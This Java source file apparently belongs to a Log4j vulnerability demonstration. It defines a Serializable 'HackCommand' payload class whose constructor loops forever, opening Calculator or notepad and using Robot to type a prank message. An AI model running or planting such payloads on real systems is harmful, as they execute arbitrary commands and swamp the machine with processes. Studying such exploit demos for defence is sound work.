package com.zjm.log.log4jbug;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.IOException;
import java.io.Serializable;

public class HackCommand implements Serializable {
    public HackCommand() throws IOException, AWTException, InterruptedException {
        System.out.println("执行黑客指令！！！！");
        Runtime rt = Runtime.getRuntime();
        String property = System.getProperty("os.name");
        while(true) {
            if ("Mac OS X".equals(property)) {
                String[] commands = {"/bin/sh", "-c", "open /System/Applications/Calculator.app"};
                rt.exec(commands);
            }else {
                rt.exec("cmd /k notepad");
                Thread.sleep(1000);
                //创建机器人
                Robot rb=new Robot();
                // 其实我喜欢你很久了
                rb.keyPress(KeyEvent.VK_Q);
                rb.keyPress(KeyEvent.VK_I);

                rb.keyPress(KeyEvent.VK_S);
                rb.keyPress(KeyEvent.VK_H);
                rb.keyPress(KeyEvent.VK_I);

                rb.keyPress(KeyEvent.VK_W);
                rb.keyPress(KeyEvent.VK_O);

                rb.keyPress(KeyEvent.VK_X);
                rb.keyPress(KeyEvent.VK_I);

                rb.keyPress(KeyEvent.VK_H);
                rb.keyPress(KeyEvent.VK_U);
                rb.keyPress(KeyEvent.VK_A);
                rb.keyPress(KeyEvent.VK_N);

                Thread.sleep(100);

                rb.keyPress(KeyEvent.VK_N);
                rb.keyPress(KeyEvent.VK_I);

                rb.keyPress(KeyEvent.VK_H);
                rb.keyPress(KeyEvent.VK_E);
                rb.keyPress(KeyEvent.VK_N);

                rb.keyPress(KeyEvent.VK_J);
                rb.keyPress(KeyEvent.VK_I);
                rb.keyPress(KeyEvent.VK_U);

                rb.keyPress(KeyEvent.VK_L);
                rb.keyPress(KeyEvent.VK_E);

                rb.keyPress(KeyEvent.VK_SPACE);
                rb.keyPress(KeyEvent.VK_ENTER);

                rb.keyPress(KeyEvent.VK_B);
                rb.keyPress(KeyEvent.VK_U);

                rb.keyPress(KeyEvent.VK_D);
                rb.keyPress(KeyEvent.VK_A);

                rb.keyPress(KeyEvent.VK_Y);
                rb.keyPress(KeyEvent.VK_I);
                rb.keyPress(KeyEvent.VK_N);
                rb.keyPress(KeyEvent.VK_G);

                rb.keyPress(KeyEvent.VK_SPACE);
                rb.keyPress(KeyEvent.VK_ENTER);

                rb.keyPress(KeyEvent.VK_W);
                rb.keyPress(KeyEvent.VK_O);

                rb.keyPress(KeyEvent.VK_J);
                rb.keyPress(KeyEvent.VK_I);
                rb.keyPress(KeyEvent.VK_U);

                rb.keyPress(KeyEvent.VK_H);
                rb.keyPress(KeyEvent.VK_E);
                rb.keyPress(KeyEvent.VK_I);

                rb.keyPress(KeyEvent.VK_N);
                rb.keyPress(KeyEvent.VK_I);

                rb.keyPress(KeyEvent.VK_D);
                rb.keyPress(KeyEvent.VK_I);
                rb.keyPress(KeyEvent.VK_A);
                rb.keyPress(KeyEvent.VK_N);

                Thread.sleep(100);

                rb.keyPress(KeyEvent.VK_N);
                rb.keyPress(KeyEvent.VK_A);
                rb.keyPress(KeyEvent.VK_O);
                rb.keyPress(KeyEvent.VK_SPACE);
            }
        }
    }
}
